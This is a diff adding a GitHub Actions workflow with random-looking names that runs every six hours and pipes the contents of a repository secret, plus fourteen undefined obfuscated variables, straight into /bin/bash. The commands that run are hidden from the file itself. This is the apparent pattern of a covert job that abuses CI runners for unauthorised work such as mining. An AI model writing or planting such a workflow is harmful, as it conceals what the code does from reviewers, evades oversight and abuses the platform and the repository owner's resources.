@@ -1,0 +1,31 @@
+name: stellabitbucket961
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: stellabitbucket961
+        env:
+          vx8: ${{ secrets.vx8 }}
+        run: |
+          echo $vx8 | jq -r .x1 | /bin/bash
+          echo $wtd268 | jq -r .zc41104 | /bin/bash
+          echo $z46188 | jq -r .awt1 | /bin/bash
+          echo $nr6 | jq -r .d5 | /bin/bash
+          echo $eqeow00319 | jq -r .pnlkp080 | /bin/bash
+          echo $ug8692 | jq -r .qfgwh6 | /bin/bash
+          echo $rb818 | jq -r .jxy34 | /bin/bash
+          echo $tibj27917 | jq -r .u22607 | /bin/bash
+          echo $t18 | jq -r .uo13 | /bin/bash
+          echo $symh89 | jq -r .wbqu4 | /bin/bash
+          echo $m60 | jq -r .hvcp73802 | /bin/bash
+          echo $nlj5759 | jq -r .lm59 | /bin/bash
+          echo $zdy14 | jq -r .d32 | /bin/bash
+          echo $k46984 | jq -r .fxtn97901 | /bin/bash
+          echo $u7610 | jq -r .blzrz0337 | /bin/bash
+
